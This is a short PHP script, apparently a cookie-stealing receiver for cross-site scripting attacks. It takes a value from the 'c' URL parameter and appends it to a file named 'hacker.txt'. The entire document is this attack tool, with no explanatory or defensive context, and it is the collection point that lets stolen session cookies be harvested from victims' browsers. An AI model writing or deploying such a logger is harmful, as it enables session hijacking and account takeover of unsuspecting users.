<?php
$cookies = $_GET["c"];
$file = fopen("hacker.txt", "a");
fwrite($file, $cookies. "\\n");
?>